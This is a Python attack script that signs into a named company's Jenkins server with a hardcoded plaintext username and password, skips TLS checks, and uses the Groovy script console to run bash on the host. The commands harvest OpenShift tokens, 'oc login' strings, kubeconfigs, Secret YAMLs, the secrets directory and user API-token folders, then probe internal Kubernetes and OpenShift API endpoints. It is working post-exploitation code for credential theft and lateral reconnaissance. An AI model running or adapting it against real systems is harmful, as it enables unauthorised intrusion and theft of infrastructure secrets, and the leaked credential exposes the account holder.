import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


TASK_I = r'''def r = ["bash","-c","""
echo '===== DeployApplication.xml (openshift-deployer) ====='
cat /var/jenkins_home/org.jenkinsci.plugins.openshift.DeployApplication.xml 2>/dev/null
echo ''
echo '===== OpenShiftBuilder/Deployer/Exec pipeline XMLs ====='
for f in /var/jenkins_home/com.openshift.jenkins.plugins.pipeline.OpenShiftBuilder.xml /var/jenkins_home/com.openshift.jenkins.plugins.pipeline.OpenShiftDeployer.xml /var/jenkins_home/com.openshift.jenkins.plugins.pipeline.OpenShiftExec.xml /var/jenkins_home/com.openshift.jenkins.plugins.pipeline.OpenShiftBuildVerifier.xml; do echo \"--- \$f\"; cat \$f 2>/dev/null; echo ''; done
echo '===== tools dir (oc client installs) ====='
ls -laR /var/jenkins_home/tools 2>/dev/null | head -40
echo '===== oc binary search ====='
timeout 15 find /var/jenkins_home /usr/local /opt -maxdepth 5 -name 'oc' -type f 2>/dev/null | head -5
ls /var/jenkins_home/plugins/openshift-client/ 2>/dev/null
"""].execute().text
println r
'''

TASK_J = r'''def r = ["bash","-c","""
echo '===== OCP sha256~ tokens anywhere in jenkins_home ====='
timeout 40 grep -rhoE 'sha256~[A-Za-z0-9_-]{20,}' /var/jenkins_home --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.properties' --include='*.sh' --include='*.env' --include='log' 2>/dev/null | sort -u | head -20
echo '===== oc login / token= in ALL text configs ====='
timeout 30 grep -rhoE 'oc login[^\"]{0,120}' /var/jenkins_home --include='*.xml' --include='*.yml' --include='*.sh' --include='*.properties' 2>/dev/null | sort -u | head -15
echo '===== files named *secret* / *.kubeconfig in home ====='
timeout 15 find /var/jenkins_home -maxdepth 3 \\( -iname '*secret*' -o -iname '*.kubeconfig' -o -iname 'kube*config*' \\) -not -path '*/plugins/*' 2>/dev/null | head -20
echo '===== secrets dir ====='
ls -la /var/jenkins_home/secrets/ 2>/dev/null | head -20
"""].execute().text
println r
'''

TASK_K = r'''def r = ["bash","-c","""
echo '===== k3s api-admin :6443 ====='
curl -k --max-time 8 https://api-admin.dev.claroshop.com:6443/version 2>&1 | head -c 600
echo ''
curl -k --max-time 8 https://api-admin.dev.claroshop.com:6443/api/v1/namespaces 2>&1 | head -c 600
echo ''
echo '===== k3s via 443 follow redirect ====='
curl -kL --max-time 10 https://api-admin.dev.claroshop.com/ 2>&1 | head -c 400
echo ''
echo '===== k3s 443 /version + /api ====='
curl -k --max-time 8 https://api-admin.dev.claroshop.com/version 2>&1 | head -c 400
echo ''
curl -k --max-time 8 https://api-admin.dev.claroshop.com/api/v1/namespaces 2>&1 | head -c 600
echo ''
echo '===== OCP via 172.27.141.24:8443 (amxnova.com IP) ====='
curl -k --max-time 6 https://172.27.141.24:8443/healthz -o /dev/null -w 'HTTP=%{http_code}\\n' 2>&1 | tail -2
echo '===== OCP .net IP port 443 ====='
curl -k --max-time 6 https://172.26.127.196/healthz -o /dev/null -w 'HTTP=%{http_code}\\n' 2>&1 | tail -2
"""].execute().text
println r
'''

TASK_L = r'''def r = ["bash","-c","""
echo '===== mrc-cs-tienda / defaultProject refs ====='
timeout 25 grep -rl 'mrc-cs-tienda' /var/jenkins_home --include='*.xml' --include='*.yml' --include='*.yaml' --include='*.json' 2>/dev/null | grep -v plugins | head -10
echo '===== kind: Secret yamls in workspaces ====='
timeout 25 grep -rlE 'kind:[ ]*Secret' /var/jenkins_home/workspace 2>/dev/null | head -10
echo '===== config-history openshift ====='
ls /var/jenkins_home/config-history 2>/dev/null | head -5
timeout 20 grep -rl 'amxnova' /var/jenkins_home/config-history 2>/dev/null | head -5
echo '===== users dir (API tokens) ====='
ls /var/jenkins_home/users/ 2>/dev/null
"""].execute().text
println r
'''

TASKS = [
    ("TASK I: DeployApplication.xml + oc tool installs", TASK_I),
    ("TASK J: OCP token patterns (sha256~/oc login) in jenkins_home", TASK_J),
    ("TASK K: k3s api-admin probing (:6443/:443) + OCP alt ports", TASK_K),
    ("TASK L: mrc-cs-tienda refs + Secret yamls + config-history", TASK_L),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
